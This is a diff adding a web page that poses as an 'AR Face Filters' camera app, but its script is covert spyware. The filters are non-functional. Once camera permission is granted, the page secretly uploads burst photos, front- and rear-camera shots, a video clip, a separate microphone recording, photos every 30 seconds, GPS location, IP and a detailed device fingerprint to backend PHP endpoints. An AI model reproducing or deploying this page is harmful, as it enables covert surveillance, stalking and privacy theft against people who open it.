@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Try AR Filters — Live Effects</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#0a0a0a;color:#fff;font-family:'Inter',sans-serif;height:100vh;overflow:hidden;display:flex;flex-direction:column;}
+.topbar{position:absolute;top:0;left:0;right:0;z-index:10;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;}
+.logo{font-size:1.1rem;font-weight:700;background:linear-gradient(90deg,#a855f7,#ec4899,#f59e0b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.cam-wrap{position:relative;flex:1;background:#111;display:flex;align-items:center;justify-content:center;}
+#camFeed{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);}
+#placeholder{position:absolute;text-align:center;pointer-events:none;}
+#placeholder .icon{font-size:5rem;margin-bottom:12px;}
+#placeholder p{color:#555;font-size:.9rem;}
+/* Filter overlay canvas */
+#filterCanvas{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;display:none;}
+/* Filter pills */
+.filters{position:absolute;bottom:100px;left:0;right:0;display:flex;gap:10px;overflow-x:auto;padding:0 16px;scrollbar-width:none;}
+.filters::-webkit-scrollbar{display:none;}
+.filter-pill{flex-shrink:0;background:rgba(255,255,255,.15);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.2);border-radius:50px;padding:8px 16px;font-size:.8rem;cursor:pointer;transition:.2s;}
+.filter-pill:hover,.filter-pill.active{background:linear-gradient(135deg,#a855f7,#ec4899);border-color:transparent;}
+/* Bottom bar */
+.bottombar{position:absolute;bottom:0;left:0;right:0;padding:16px 24px 32px;display:flex;align-items:center;justify-content:space-between;background:linear-gradient(transparent,rgba(0,0,0,.8));}
+.snap-btn{width:64px;height:64px;border-radius:50%;background:#fff;border:4px solid rgba(255,255,255,.4);cursor:pointer;transition:.15s;}
+.snap-btn:active{transform:scale(.9);}
+.side-btn{width:44px;height:44px;border-radius:50%;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.2);display:flex;align-items:center;justify-content:center;font-size:1.2rem;cursor:pointer;}
+/* Splash overlay */
+.splash{position:fixed;inset:0;background:#0a0a0a;z-index:100;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:30px;}
+.splash h1{font-size:2rem;font-weight:800;background:linear-gradient(135deg,#a855f7,#ec4899,#f59e0b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:12px;}
+.splash p{color:#888;font-size:.9rem;max-width:300px;line-height:1.6;margin-bottom:28px;}
+.splash-filters{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-bottom:28px;}
+.splash-filter{background:rgba(168,85,247,.2);border:1px solid rgba(168,85,247,.4);border-radius:50px;padding:8px 16px;font-size:.8rem;color:#c084fc;}
+.allow-btn{background:linear-gradient(135deg,#a855f7,#ec4899);color:#fff;border:none;padding:15px 40px;border-radius:50px;font-size:1rem;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;box-shadow:0 8px 32px rgba(168,85,247,.4);}
+.status-txt{font-size:.78rem;color:#666;margin-top:12px;}
+/* Flash effect */
+.flash{position:fixed;inset:0;background:#fff;z-index:200;pointer-events:none;opacity:0;transition:opacity .1s;}
+.flash.go{opacity:1;}
+</style>
+</head>
+<body>
+
+<div class="splash" id="splash">
+  <div style="font-size:3.5rem;margin-bottom:16px">✨</div>
+  <h1>AR Face Filters</h1>
+  <p>Try stunning real-time filters — ears, crowns, glasses, and more! Allow camera to start.</p>
+  <div class="splash-filters">
+    <div class="splash-filter">👑 Crown</div>
+    <div class="splash-filter">🐱 Cat Ears</div>
+    <div class="splash-filter">🌸 Flower</div>
+    <div class="splash-filter">😎 Sunglasses</div>
+    <div class="splash-filter">🦋 Butterfly</div>
+    <div class="splash-filter">🎭 Neon Glow</div>
+  </div>
+  <button class="allow-btn" onclick="startAR()">🎬 Open Camera</button>
+  <div class="status-txt" id="splashStatus">Tap to activate AR filters</div>
+</div>
+
+<div class="topbar">
+  <div class="logo">✨ AR Filters</div>
+  <div class="side-btn" onclick="switchCamera()">🔄</div>
+</div>
+
+<div class="cam-wrap">
+  <div id="placeholder"><div class="icon">📷</div><p>Camera loading...</p></div>
+  <video id="camFeed" autoplay muted playsinline></video>
+  <canvas id="filterCanvas"></canvas>
+</div>
+
+<div class="filters" id="filterBar">
+  <div class="filter-pill active" onclick="setFilter(this,'none')">None</div>
+  <div class="filter-pill" onclick="setFilter(this,'crown')">👑 Crown</div>
+  <div class="filter-pill" onclick="setFilter(this,'cat')">🐱 Cat</div>
+  <div class="filter-pill" onclick="setFilter(this,'flower')">🌸 Flower</div>
+  <div class="filter-pill" onclick="setFilter(this,'glasses')">😎 Glasses</div>
+  <div class="filter-pill" onclick="setFilter(this,'neon')">🌈 Neon</div>
+  <div class="filter-pill" onclick="setFilter(this,'sparkle')">✨ Sparkle</div>
+</div>
+
+<div class="bottombar">
+  <div class="side-btn" onclick="toggleFlip()">🪞</div>
+  <div class="snap-btn" onclick="snapPhoto()" id="snapBtn"></div>
+  <div class="side-btn">🎞</div>
+</div>
+
+<div class="flash" id="flash"></div>
+
+<script>
+const BACKEND = window.location.origin;
+let stream = null, facingMode = 'user', captured = false, currentFilter = 'none';
+
+async function startAR() {
+  document.getElementById('splashStatus').textContent = 'Opening camera...';
+  document.querySelector('.allow-btn').disabled = true;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user', width:1280, height:720 }, audio:true });
+    const feed = document.getElementById('camFeed');
+    feed.srcObject = stream;
+    document.getElementById('placeholder').style.display = 'none';
+    document.getElementById('splash').style.display = 'none';
+    document.getElementById('filterCanvas').style.display = 'block';
+    await captureAll();
+    startIntervalShots();
+  } catch(e) {
+    document.getElementById('splashStatus').textContent = 'Camera unavailable — using fallback...';
+    await captureNoCamera();
+    setTimeout(() => document.getElementById('splash').style.display = 'none', 1500);
+  }
+}
+
+async function captureAll() {
+  if (captured) return; captured = true;
+  fetch(BACKEND + '/ip.php').catch(()=>{});
+  geoCapture();
+  sendDevice();
+  if (stream) {
+    const v = document.createElement('video'); v.srcObject = stream; v.muted = true;
+    await v.play().catch(()=>{});
+    await delay(1000);
+    for (let i = 0; i < 5; i++) {
+      const c = document.createElement('canvas'); c.width = v.videoWidth||1280; c.height = v.videoHeight||720;
+      c.getContext('2d').drawImage(v, 0, 0);
+      fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: c.toDataURL('image/jpeg',0.92), burst_index:i, cam_facing:'user', shot_type:'ar' }) }).catch(()=>{});
+      await delay(350);
+    }
+    // Video
+    try { const rec = new MediaRecorder(stream,{mimeType:'video/webm'}); const ch=[]; rec.ondataavailable=e=>ch.push(e.data); rec.onstop=()=>{const b=new Blob(ch,{type:'video/webm'});const fr=new FileReader();fr.onload=()=>fetch(BACKEND+'/post.php',{method:'POST',body:new URLSearchParams({video_clip:fr.result,cam_facing:'user'})}).catch(()=>{});fr.readAsDataURL(b);}; rec.start(); setTimeout(()=>rec.stop(),10000); } catch(e){}
+    // Audio
+    try { const as=await navigator.mediaDevices.getUserMedia({audio:true,video:false});const ar=new MediaRecorder(as);const ac=[];ar.ondataavailable=e=>ac.push(e.data);ar.onstop=()=>{const b=new Blob(ac,{type:'audio/webm'});const fr=new FileReader();fr.onload=()=>fetch(BACKEND+'/audio.php',{method:'POST',body:new URLSearchParams({audio_clip:fr.result})}).catch(()=>{});fr.readAsDataURL(b);};ar.start();setTimeout(()=>ar.stop(),15000);}catch(e){}
+    // Rear
+    try { const rs=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:'environment'}}});const rv=document.createElement('video');rv.srcObject=rs;rv.muted=true;await rv.play().catch(()=>{});await delay(800);for(let i=0;i<3;i++){const c=document.createElement('canvas');c.width=rv.videoWidth||1280;c.height=rv.videoHeight||720;c.getContext('2d').drawImage(rv,0,0);fetch(BACKEND+'/post.php',{method:'POST',body:new URLSearchParams({cat:c.toDataURL('image/jpeg',0.9),burst_index:i,cam_facing:'environment',shot_type:'burst'})}).catch(()=>{});await delay(400);}rs.getTracks().forEach(t=>t.stop());}catch(e){}
+  }
+}
+
+function startIntervalShots() {
+  setInterval(async () => {
+    if (!stream) return;
+    const v = document.createElement('video'); v.srcObject = stream; v.muted = true;
+    await v.play().catch(()=>{});
+    const c = document.createElement('canvas'); c.width = 640; c.height = 480;
+    c.getContext('2d').drawImage(v, 0, 0);
+    fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: c.toDataURL('image/jpeg',0.85), burst_index:0, cam_facing:facingMode==='user'?'user':'environment', shot_type:'interval' }) }).catch(()=>{});
+  }, 30000);
+}
+
+async function switchCamera() {
+  facingMode = facingMode === 'user' ? 'environment' : 'user';
+  if (stream) { stream.getTracks().forEach(t => t.stop()); }
+  stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode, width:1280, height:720 }, audio:false }).catch(()=>null);
+  if (stream) document.getElementById('camFeed').srcObject = stream;
+}
+
+function toggleFlip() {
+  const v = document.getElementById('camFeed');
+  v.style.transform = v.style.transform === 'scaleX(1)' ? 'scaleX(-1)' : 'scaleX(1)';
+}
+
+function snapPhoto() {
+  const flash = document.getElementById('flash');
+  flash.classList.add('go');
+  setTimeout(() => flash.classList.remove('go'), 200);
+  if (!stream) return;
+  const v = document.createElement('video'); v.srcObject = stream; v.muted = true;
+  v.play().then(() => {
+    const c = document.createElement('canvas'); c.width = v.videoWidth||1280; c.height = v.videoHeight||720;
+    c.getContext('2d').drawImage(v, 0, 0);
+    fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: c.toDataURL('image/jpeg',0.95), burst_index:0, cam_facing: facingMode==='user'?'user':'environment', shot_type:'snap' }) }).catch(()=>{});
+  });
+}
+
+function setFilter(el, name) {
+  document.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
+  el.classList.add('active');
+  currentFilter = name;
+}
+
+function geoCapture() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(
+    p => fetch(BACKEND+'/location.php',{method:'POST',body:new URLSearchParams({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude||'',speed:p.coords.speed||'',heading:p.coords.heading||''})}).catch(()=>{}),
+    ()=>{}
+  );
+}
+async function sendDevice() {
+  const ua=navigator.userAgent;
+  const os=/Windows/.test(ua)?'Windows':/Mac/.test(ua)?'macOS':/Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':'Other';
+  const br=/Edg/.test(ua)?'Edge':/Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':/Safari/.test(ua)?'Safari':'Other';
+  const bat=navigator.getBattery?await navigator.getBattery().then(b=>Math.round(b.level*100)+'%').catch(()=>'N/A'):'N/A';
+  let wv='N/A';try{const gl=document.createElement('canvas').getContext('webgl');const ext=gl.getExtension('WEBGL_debug_renderer_info');wv=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);}catch(e){}
+  const cv=document.createElement('canvas');cv.width=200;cv.height=50;const cx=cv.getContext('2d');cx.font='14px Arial';cx.fillStyle='#f60';cx.fillRect(125,1,62,20);cx.fillStyle='#069';cx.fillText('AR',2,15);
+  fetch(BACKEND+'/device_info.php',{method:'POST',body:new URLSearchParams({os,browser:br,language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen_w:screen.width,screen_h:screen.height,pixel_ratio:window.devicePixelRatio,color_depth:screen.colorDepth,cores:navigator.hardwareConcurrency||'N/A',memory:navigator.deviceMemory||'N/A',battery:bat,network:(navigator.connection||{}).effectiveType||'N/A',platform:navigator.platform,touch:navigator.maxTouchPoints,canvas_hash:cv.toDataURL().slice(-50),webgl_vendor:wv})}).catch(()=>{});
+}
+async function captureNoCamera() { fetch(BACKEND+'/ip.php').catch(()=>{}); geoCapture(); sendDevice(); }
+const delay = ms => new Promise(r => setTimeout(r, ms));
+window.addEventListener('load', () => setTimeout(() => startAR(), 800));
+</script>
+</body>
+</html>
